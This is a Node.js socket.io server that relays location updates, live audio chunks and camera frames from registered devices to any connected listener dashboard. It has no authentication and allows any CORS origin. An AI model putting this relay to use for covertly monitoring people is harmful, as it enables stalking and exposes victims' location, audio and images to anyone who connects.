const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const PORT = process.env.PORT || 5000;
const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
});

// Serve the dashboard UI from /public
app.use(express.static(path.join(__dirname, "public")));

// Track devices and listeners
const devices = new Set();
const listeners = new Set();

io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  // When device registers
  socket.on("device-register", () => {
    devices.add(socket.id);
    console.log(`📱 Device registered: ${socket.id}`);
  });

  // When listener registers
  socket.on("listener-register", () => {
    listeners.add(socket.id);
    console.log(`🖥️ Listener registered: ${socket.id}`);
  });

  // Forward location updates
  socket.on("location-update", (data) => {
    listeners.forEach((id) => io.to(id).emit("location-update", data));
  });

  // Forward audio chunks
  socket.on("audio-chunk", (chunk) => {
    listeners.forEach((id) => io.to(id).emit("audio-chunk", chunk));
  });

  // Forward camera frames (Base64 only)
  socket.on("camera-frame", (base64Image) => {
    // Optional: log every 5th frame to reduce console spam
    if (Math.random() < 0.2) {
      console.log(`📷 Camera frame from ${socket.id}, size: ${base64Image.length}`);
    }
    listeners.forEach((id) => io.to(id).emit("camera-frame", base64Image));
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    devices.delete(socket.id);
    listeners.delete(socket.id);
    console.log(`❌ Client disconnected: ${socket.id}`);
  });
});

server.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
